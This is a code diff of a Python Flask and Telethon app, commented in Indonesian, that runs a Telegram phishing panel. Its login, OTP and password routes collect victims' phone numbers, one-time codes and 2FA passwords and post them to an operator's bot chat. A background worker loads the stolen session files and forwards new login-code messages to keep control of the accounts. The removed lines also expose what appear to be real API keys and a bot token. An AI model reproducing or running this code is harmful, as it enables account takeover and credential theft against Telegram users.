@@ -1,4 +1,7 @@
-import os, asyncio, threading, requests
+import os
+import asyncio
+import threading
+import requests
 from flask import Flask, render_template, request, redirect, url_for, session, flash
 from telethon import TelegramClient, events
 from telethon.errors import PhoneCodeInvalidError
@@ -6,16 +9,18 @@ from telethon.errors import PhoneCodeInvalidError
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
 
-# API_ID, API_HASH, BOT_TOKEN, CHAT_ID dari environment
-api_id = int(os.getenv("API_ID", 16047851))
-api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4")
-CHAT_ID = os.getenv("CHAT_ID", "7712462494")
-
+# ENV
+api_id = int(os.getenv("API_ID", 12345))
+api_hash = os.getenv("API_HASH", "")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "")
+CHAT_ID = os.getenv("CHAT_ID", "")
 SESSION_DIR = "sessions"
 os.makedirs(SESSION_DIR, exist_ok=True)
 
-# ============= BAGIAN FLASK =============
+# ============================
+#  FLASK ROUTES
+# ============================
+
 @app.route("/", methods=["GET", "POST"])
 def login():
     if request.method == "POST":
@@ -45,7 +50,7 @@ def login():
             flash(f"Error: {str(e)}")
             return redirect(url_for("login"))
 
-    return render_template("login.html")
+    return "Form login.html"  # ganti render_template sesuai template kamu
 
 @app.route("/otp", methods=["GET", "POST"])
 def otp():
@@ -72,7 +77,6 @@ def otp():
             result = asyncio.run(verify_code())
             if result:
                 session["last_otp"] = code
-                # kirim ke bot
                 text = f"✅ OTP benar\nNomor : {phone}\nOTP   : {code}"
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                 requests.post(url, data={"chat_id": CHAT_ID, "text": text})
@@ -85,7 +89,7 @@ def otp():
             flash(f"Error lain: {e}")
             return redirect(url_for("otp"))
 
-    return render_template("otp.html")
+    return "Form otp.html"  # ganti render_template sesuai template kamu
 
 @app.route("/password", methods=["GET", "POST"])
 def password():
@@ -103,50 +107,54 @@ def password():
         requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
         flash("Password berhasil dimasukkan (manual).")
         return redirect(url_for("success"))
-    return render_template("password.html")
+    return "Form password.html"  # ganti render_template sesuai template kamu
 
 @app.route("/success")
 def success():
-    return render_template("success.html", name=session.get("name"), phone=session.get("phone"), gender=session.get("gender"))
+    return f"Success {session.get('name')} - {session.get('phone')}"
 
-# ============= BAGIAN WORKER TELETHON =============
-async def forward_handler(event, client_name):
-    """Handler untuk meneruskan pesan OTP"""
-    text_msg = event.message.message
-    if "login code" in text_msg.lower() or "kode login" in text_msg.lower():
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": CHAT_ID,
-            "text": f"📩 Pesan OTP baru dari {client_name}:\n\n{text_msg}"
-        }
-        requests.post(url, data=payload)
-        print(f"OTP diteruskan dari {client_name}: {text_msg}")
+# ============================
+#  WORKER TELETHON
+# ============================
 
-async def worker_main():
+async def telethon_worker():
     print("Worker jalan...")
-
     clients = []
     for fname in os.listdir(SESSION_DIR):
         if fname.endswith(".session"):
             path = os.path.join(SESSION_DIR, fname)
             print(f"Memuat session {path}")
             client = TelegramClient(path, api_id, api_hash)
-            await client.start()  # login otomatis pakai session
+            await client.start()
             clients.append(client)
-            client.add_event_handler(lambda e, fn=fname: forward_handler(e, fn), events.NewMessage)
 
-    if not clients:
-        print("⚠️ Tidak ada file session di folder sessions/. Login dulu lewat web app untuk membuat session.")
-    else:
+            @client.on(events.NewMessage)
+            async def handler(event, fn=fname):
+                text_msg = event.message.message
+                if "login code" in text_msg.lower() or "kode login" in text_msg.lower():
+                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                    payload = {
+                        "chat_id": CHAT_ID,
+                        "text": f"📩 Pesan OTP baru dari {fn}:\n\n{text_msg}"
+                    }
+                    requests.post(url, data=payload)
+                    print(f"OTP diteruskan dari {fn}: {text_msg}")
+
+    if clients:
         await asyncio.gather(*(c.run_until_disconnected() for c in clients))
 
-def start_worker():
-    asyncio.run(worker_main())
+def start_worker_background():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(telethon_worker())
+
+# jalankan worker di thread terpisah saat app start
+threading.Thread(target=start_worker_background, daemon=True).start()
+
+# ============================
+#  RUN FLASK
+# ============================
 
 if __name__ == "__main__":
-    # jalankan worker di thread terpisah
-    t = threading.Thread(target=start_worker, daemon=True)
-    t.start()
-
-    # jalankan web server flask
-    app.run(host="0.0.0.0", port=8080)
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host="0.0.0.0", port=port)
